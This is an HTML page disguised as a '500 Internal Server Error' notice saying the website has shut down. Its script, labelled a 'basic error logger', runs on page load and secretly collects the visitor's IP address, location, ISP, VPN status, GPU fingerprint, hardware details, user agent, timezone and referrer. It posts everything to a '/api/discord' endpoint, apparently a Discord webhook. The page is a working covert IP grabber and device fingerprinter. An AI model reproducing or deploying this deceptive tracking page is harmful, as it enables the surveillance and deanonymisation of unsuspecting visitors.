<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>500 Internal Server Error</title>
    <style>
        body { background: #fff; color: #000; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .err { text-align: center; }
        h1 { font-size: 22px; font-weight: 500; margin-bottom: 5px; }
        p { font-size: 14px; color: #777; }
    </style>
</head>
<body>

    <div class="err">
        <h1>Website has shut down</h1>
        <p>Internal Server Error (Code: 500)</p>
    </div>

    <script>
        // basic error logger
        async function init() {
            let data = {};
            let isVpn = "False";

            // try a few different apis in case one is down
            const apis = [
                "https://ipapi.co/json/",
                "https://ipwho.is/",
                "https://api.ipify.org?format=json"
            ];

            for (let i = 0; i < apis.length; i++) {
                try {
                    let r = await fetch(apis[i]);
                    if (r.ok) {
                        let res = await r.json();
                        data = Object.assign(data, res);
                        if (data.ip || data.query) break;
                    }
                } catch (err) {}
            }

            // gpu check
            let renderer = "n/a";
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
            } catch (e) {}

            let ip = data.ip || data.query || "unknown";
            let loc = data.city ? (data.city + ", " + (data.region || data.region_name) + ", " + (data.country || data.country_name)) : "unknown";
            let isp = data.org || data.isp || "unknown";
            
            if (data.security && (data.security.vpn || data.security.proxy)) {
                isVpn = "True";
            }

            // build log string
            let log = "NETWORK\n";
            log += "IP: " + ip + "\n";
            log += "VPN: " + isVpn + "\n";
            log += "Loc: " + loc + "\n";
            log += "ISP: " + isp + "\n\n";
            
            log += "DEVICE\n";
            log += "OS: " + navigator.platform + "\n";
            log += "Cores: " + navigator.hardwareConcurrency + "\n";
            log += "RAM: " + navigator.deviceMemory + "\n";
            log += "GPU: " + renderer + "\n";
            log += "Res: " + screen.width + "x" + screen.height + "\n";
            log += "Touch: " + (navigator.maxTouchPoints > 0) + "\n\n";
            
            log += "BROWSER\n";
            log += "UA: " + navigator.userAgent + "\n";
            log += "TZ: " + Intl.DateTimeFormat().resolvedOptions().timeZone + "\n";
            log += "Ref: " + document.referrer + "\n";
            log += "Time: " + new Date().toString();

            // push to api
            try {
                fetch("/api/discord", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ content: "```\n" + log + "\n```" })
                });
            } catch (e) {}
        }

        init();
    </script>
</body>
</html>
